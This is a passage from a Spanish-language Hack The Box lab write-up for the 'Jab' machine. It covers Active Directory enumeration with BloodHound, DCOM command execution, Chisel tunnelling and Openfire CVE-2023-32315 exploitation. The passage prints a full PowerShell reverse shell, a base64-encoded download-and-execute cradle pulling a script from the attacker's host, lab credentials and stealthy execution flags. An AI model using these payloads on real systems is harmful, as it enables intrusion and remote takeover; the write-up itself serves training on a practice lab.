No encontramos nada relevante en los recursos compartidos, por lo que decidimos utilizar **BloodHound** para obtener una visión más clara de la infraestructura. BloodHound generará varios archivos JSON, ya que utiliza una base de datos NoSQL. Es recomendable comprimir estos archivos en un archivo `.zip` para facilitar su manejo.

```zsh
bloodhound-python -d jab.htb -ns 10.10.11.4 -u svc_openfire -p '!@#$%^&*(1qazxsw' -c all --zip
```

Este paso nos permitirá recopilar más información sobre el entorno y determinar posibles vectores de ataque adicionales.

Nuestro Usuario tiene ejecución de Derechos sobre DC01.JAB.HTB, podemos tener ayuda con bloodhound y tenemos la información necesaria:

"**El usuario SVC_OPENFIRE@JAB. HTB es miembro del grupo local Usuarios COM distribuidos en el equipo DC01. JAB. HTB. Esto puede permitir la ejecución de código en determinadas condiciones mediante la creación de instancias de un objeto COM en un equipo remoto e invocando sus métodos.***"


<figure>
<img src="/assets/img/Jab/Imagen14.png" >
</figure>  

Bloodhound es super genial por que ya nos dice que debemos realizar en esto casos 

<figure>
<img src="/assets/img/Jab/Imagen15.png" >
</figure>  

Podemos ejecutar comando con `nxc` o `crackmapexec` para verificar si podemos hacer lo que nos dice bloodhound, para lo cual utilizamos el siguiente comando en nxc 

## User Flag

```zsh
nxc smb 10.10.11.4 -u svc_openfire -p '!@#$%^&*(1qazxsw' --exec-method mmcexec -x 'ping ip'
```

<figure>
<img src="/assets/img/Jab/Imagen16.png" >
</figure>  
y utilizamos la herramienta tcpdump  para verificar que los paquetes de tipo ICMP estén llegando en nuestro caso es correcto. 
```zsh
sudo tcpdump -i tun0 icmp
```

Como podemos ejecutar comandos, vamos a crear una simple reverse shell en powershell llamado shell.ps1

```zsh
$client = New-Object System.Net.Sockets.TCPClient('ip',port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Creamos un archivo de comandos de powershell para descargar y ejecutar el archivo sin dejar rastros en la memoria del sistema es una buena practica 

```zsh
cat DownloadString                                   
IEX(New-Object Net.WebClient).downloadString('http://ip:8000/shell.ps1')
```


```zsh
cat DownloadString | iconv -t utf-16le | base64 -w 0                            
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQAOgA4ADAAMAAwAC8AcwBoAGUAbABsAC4AcABzADEAJwApAAoA  
```


1. **`iconv -t utf-16le`**:
    - Convierte el contenido leído por `cat` a la codificación **UTF-16LE** (UTF-16 Little Endian).
    - Esto suele hacerse porque algunos sistemas (como Windows o aplicaciones específicas) requieren que los datos estén codificados en este formato.
2. **`base64 -w 0`**:
    - Convierte el contenido codificado en UTF-16LE a una cadena en formato **Base64**.
    - El parámetro `-w 0` asegura que la salida no tenga saltos de línea, es decir, produce una única línea continua.

Ahora vamos a utilizar Impacket para obtener una reverse shell utilizamos todos los comandos anteriormente mencionados para realizar lo siguiente.

```zsh
impacket-dcomexec jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.10.11.4 'powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQAOgA4ADAAMAAwAC8AcwBoAGUAbABsAC4AcABzADEAJwApAAoA' -object MMC20 -silentcommand
```


1. **`-object MMC20`**

 ¿Qué es `MMC20`?
- **`MMC20`** se refiere al objeto COM (Component Object Model) de **Microsoft Management Console (versión 2.0)**.
- Microsoft Management Console es una herramienta en Windows que permite administrar configuraciones de sistemas, como usuarios, servicios, y otros aspectos del sistema operativo.

 ¿Por qué se usa este objeto?
- Este objeto está presente en la mayoría de los sistemas Windows y, si no está restringido, permite ejecutar comandos en el sistema subyacente.
- Al utilizar `MMC20`, el atacante aprovecha el hecho de que el objeto COM puede invocar procesos o comandos como parte de sus funcionalidades administrativas.

 2. **`-silentcommand`**

- **`-silentcommand`** indica que el comando debe ejecutarse **silenciosamente**, es decir:
  - No se genera salida visible en la pantalla del atacante.
  - No hay notificaciones ni ventanas emergentes en el sistema objetivo.
- Es una forma de hacer que el ataque sea menos ruidoso y menos detectable.

Tenemos que tener una ventana como servidor web y otra ventana en escucha en el puerto 9001

```zsh
python3 -m http.server
```

```zsh
nc -lvnp 9001
```

Y tendremos acceso como svc_openfire 

<figure>
<img src="/assets/img/Jab/Imagen17.png" >
</figure>  

## Privilege Escalation

¡Primera bandera conseguida! Sabemos que el usuario objetivo es **svc_openfire**. Openfire es una plataforma de mensajería instantánea escrita en Java que utiliza el protocolo XMPP. Este sistema permite configurar y gestionar un servidor de mensajería propio, ofreciendo herramientas como administración de usuarios, compartición de archivos, auditoría de mensajes, envío de mensajes offline y broadcast, creación de grupos, entre otras funcionalidades. Además, dispone de numerosos plugins gratuitos que amplían y personalizan sus capacidades.

Con esta información, procedemos a explorar qué puertos están abiertos en la máquina de nuestra víctima utilizando el siguiente comando: 

```zsh
netstat -ano | findstr LIST
```

El resultado muestra que el puerto **9090** está en escucha, indicando que Openfire está corriendo en esta máquina. Aquí un extracto relevante:

```
TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2092
TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       3328
TCP    127.0.0.1:9091         0.0.0.0:0              LISTENING       3328
```

El puerto 9090 es particularmente importante, ya que es donde se ejecuta la interfaz administrativa de Openfire. Este hallazgo nos permitirá planificar el siguiente paso para avanzar en la explotación de la máquina.

En este punto, vamos a utilizar **Chisel** para establecer un túnel y realizar pivoting. Los pasos a seguir son los siguientes:

1. **Instalar Chisel en nuestra máquina local (servidor):**  
   Descargamos e instalamos Chisel con el siguiente comando:  
   ```zsh
   sudo apt install chisel
   ```

2. **Descargar el cliente Chisel para Windows:**  
   En la máquina atacante, descargamos el cliente Windows desde el siguiente enlace:  
   [chisel_windows_amd64.gz](https://github.com/jpillora/chisel/releases/tag/v1.10.1)  
   Luego, descomprimimos el archivo con:  
   ```zsh
   gzip -d chisel_1.10.1_windows_amd64.gz
   ```

   Para transferir el cliente a la máquina víctima, podemos servir el archivo desde nuestra máquina atacante y descargarlo en la víctima con:  
   ```zsh
   curl http://ip:8000/chisel_1.10.1_windows_amd64 -o chisel.exe
   ```

3. **Configurar el servidor Chisel:**  
   En nuestra máquina atacante, ejecutamos el servidor con el siguiente comando:  
   ```zsh
   chisel server --reverse --port 8001
   ```

4. **Conectar desde la máquina víctima:**  
   En la máquina víctima, ejecutamos el cliente Chisel para establecer el túnel inverso:  
   ```powershell
   .\chisel.exe client ip:8001 R:9090:127.0.0.1:9090
   ```

   Esto redirigirá el puerto **9090** de la máquina víctima a nuestra máquina atacante. Ahora tenemos acceso a la interfaz gráfica de Openfire.
<figure>
<img src="/assets/img/Jab/Imagen18.png" >
</figure>  

5. **Acceder a la interfaz de Openfire:**  
   Utilizamos las credenciales del usuario **svc_openfire** para autenticarnos en la interfaz gráfica. 
<figure>
<img src="/assets/img/Jab/Imagen19.png" >
</figure>  

6. **Subir un plugin malicioso:**  
   Descargamos el plugin **Manage Tools**, que explota la vulnerabilidad [CVE-2023-32315](https://github.com/miko550/CVE-2023-32315), permitiendo ejecución de comandos remotos. El archivo `.jar` se descarga y se sube a través de la interfaz de Openfire.
<figure>
<img src="/assets/img/Jab/Imagen20.png" >
</figure>  
7. **Configurar el plugin:**  
   Seguimos las instrucciones para configurar el plugin:  
   - Vamos a la pestaña `Server` → `Server Settings` → `Management Tool`.  
   - Introducimos la contraseña **123**.  
   - Seleccionamos la opción **System Command**.  

<figure>
<img src="/assets/img/Jab/Imagen21.png" >
</figure>  
   A partir de este punto, tenemos control completo sobre la máquina víctima, incluyendo la posibilidad de obtener una *reverse shell* como **Administrator**.

8. **Obtener una reverse shell:**  
   Para este reto, los invito a utilizar un payload en PowerShell, similar al que utilizamos anteriormente con `powershell -enc`. ¡Buena suerte! 

> ¡Ahora es su turno de escalar privilegios y capturar la bandera final!

Esta máquina pertenece a **Hack The Box**. Si quieres resolverla por tu cuenta, aquí tienes el enlace directo: [Jab - Hack The Box](https://app.hackthebox.com/machines/Jab). ¡Buena suerte!

<img src="https://media.giphy.com/media/RJaiws3GnVHcybdk0l/giphy.gif" 
     alt="Rick and Morty dancing" 
     width="100%" 
     height="100%">

<p><a href="https://giphy.com/stickers/dance-rick-and-morty-chillfolio-RJaiws3GnVHcybdk0l">via GIPHY</a></p>
